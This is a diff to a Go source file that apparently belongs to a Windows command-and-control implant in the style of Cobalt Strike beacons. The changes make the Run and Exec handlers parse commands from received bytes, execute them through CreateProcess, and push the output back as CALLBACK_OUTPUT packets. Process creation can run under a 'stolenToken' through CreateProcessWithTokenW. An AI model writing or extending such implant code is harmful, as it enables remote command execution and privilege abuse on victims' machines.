@@ -4,6 +4,7 @@ import (
 	"errors"
 	"fmt"
 	"golang.org/x/sys/windows"
+	"main/packet"
 	"os"
 	"strings"
 	"unsafe"
@@ -17,8 +18,18 @@ but run would just send `cmd` as args, and with a path length 0
 %COMSPEC% point to cmd.exe usually, and we always read %COMSPEC% as app, follow as args
 we have extracted path and args before call Run, so only deploy how to run a process is ok
 */
-func Run(path string, args string) ([]byte, error) {
-	return RunNative(path, args)
+func Run(b []byte) error {
+	path, args, err := parseCommandShell(b)
+	if err != nil {
+		return err
+	}
+	result, err := runNative(string(path), string(args))
+	if err != nil {
+		return err
+	}
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, result)
+	packet.PushResult(finalPacket)
+	return nil
 	//path = strings.Trim(path, " ")
 	//args = strings.Trim(args, " ")
 	//// handler with `shell` cmd, env var is not fully supported
@@ -49,7 +60,13 @@ func Run(path string, args string) ([]byte, error) {
 
 // just don't use cmd.exe, exec may also call CreateProcess to implement?
 func Exec(b []byte) error {
-	return ExecNative(b)
+	err := execNative(b)
+	if err != nil {
+		return err
+	}
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("exec success"))
+	packet.PushResult(finalPacket)
+	return nil
 	//parts := strings.SplitN(string(b), " ", 2)
 	//var cmd *exec.Cmd
 	//if len(parts) == 2 {
@@ -62,7 +79,7 @@ func Exec(b []byte) error {
 
 // call windowsAPI CreateProcess, when it's cmd `shell`, %COMSPEC% will be the path
 // and cmd run doesn't give path, as set path to null and args as commandline
-func RunNative(path string, args string) ([]byte, error) {
+func runNative(path string, args string) ([]byte, error) {
 	args = strings.Trim(args, " ")
 	var (
 		sI windows.StartupInfo
@@ -101,7 +118,7 @@ func RunNative(path string, args string) ([]byte, error) {
 	} else {
 		return nil, errors.New("path is not null or %COMSPEC%")
 	}
-	err = CreateProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI)
+	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI)
 
 	if err != nil {
 		return nil, err
@@ -120,7 +137,7 @@ func RunNative(path string, args string) ([]byte, error) {
 	return buf[:read.InternalHigh], nil
 }
 
-func ExecNative(b []byte) error {
+func execNative(b []byte) error {
 	var sI windows.StartupInfo
 	var pI windows.ProcessInformation
 
@@ -128,11 +145,11 @@ func ExecNative(b []byte) error {
 	// when appName set to null, will use the first part of commandLine as the app, and rest as args
 	defer windows.CloseHandle(pI.Process)
 	defer windows.CloseHandle(pI.Thread)
-	return CreateProcessNative(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI)
+	return createProcessNative(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI)
 }
 
 // if there is a token, use it to create new process
-func CreateProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation) error {
+func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation) error {
 	if isTokenValid {
 		_, _, err := createProcessWithTokenW.Call(uintptr(stolenToken), LOGON_WITH_PROFILE, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)))
 		if err != nil && err != windows.SEVERITY_SUCCESS {
